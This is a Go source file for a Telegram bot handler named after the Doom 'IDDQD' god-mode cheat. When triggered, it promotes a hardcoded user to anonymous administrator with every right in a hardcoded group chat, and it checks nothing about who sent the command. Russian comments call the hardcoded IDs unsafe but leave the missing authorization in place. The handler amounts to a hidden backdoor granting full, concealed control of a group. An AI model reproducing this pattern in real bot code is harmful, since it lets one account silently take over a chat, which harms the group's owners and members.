package handlers

import (
	"log"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type IDDQDHandler struct {
	bot *tgbotapi.BotAPI
}

func NewIDDQDHandler(bot *tgbotapi.BotAPI) *IDDQDHandler {
	return &IDDQDHandler{
		bot: bot,
	}
}

func (h *IDDQDHandler) Handle(update tgbotapi.Update) {
	// ВАЖНО: Жестко закодированные ID. Это небезопасно.
	// Должно быть настроено через конфигурацию или проверяться.
	promoteConfig := tgbotapi.PromoteChatMemberConfig{
		ChatMemberConfig: tgbotapi.ChatMemberConfig{
			ChatID: -1001165249098, // Используйте ID из конфига
			UserID: 435809098,      // Используйте ID из конфига
		},
		IsAnonymous:         true,
		CanManageChat:       true,
		CanChangeInfo:       true,
		CanPostMessages:     true,
		CanEditMessages:     true,
		CanDeleteMessages:   true,
		CanManageVoiceChats: true,
		CanInviteUsers:      true,
		CanRestrictMembers:  true,
		CanPinMessages:      true,
		CanPromoteMembers:   true,
	}
	_, err := h.bot.Request(promoteConfig)
	if err != nil {
		log.Printf("Failed to promote user: %v", err)
	} else {
		log.Println("User promoted successfully")
	}
}
